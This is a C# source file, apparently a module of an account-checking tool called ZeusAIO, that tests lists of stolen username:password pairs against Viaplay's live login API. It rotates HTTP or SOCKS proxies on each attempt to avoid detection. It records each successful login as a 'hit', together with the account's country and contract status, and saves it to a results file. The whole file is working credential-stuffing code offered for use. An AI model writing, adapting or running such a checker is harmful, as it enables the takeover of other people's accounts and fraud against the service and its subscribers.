using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace Viaplay
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }

                            httpRequest.AddHeader("User-Agent", "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14");
                            string str = "password=" + s[1];
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                     new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string strResponse = httpRequest.Post("https://login.viaplay.se/api/login/v1?deviceKey=pcdash-se&returnurl=https://content.viaplay.se/pcdash-se&username=" + s[0] + "&persistent=true", str, "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains("AuthenticationError"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("success\":true")) //hit
                                {
                                    string country = Check.Parse(strResponse, "accountCountry\":\"", "\"");
                                    string hasContracts = Check.Parse(strResponse, "hasContracts\":", ",\"");

                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - VIAPLAY] " + s[0] + ":" + s[1] + " | Country: " + country + " | Has Contracts: " + hasContracts, Color.Green);
                                    }
                                    Export.AsResult("/Viaplay_hits", s[0] + ":" + s[1] + " | Country: " + country + " | Has Contracts: " + hasContracts);
                                    return false;

                                }
                                else
                                {
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                }
                            }
                            break;
                        }
                        //break;
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

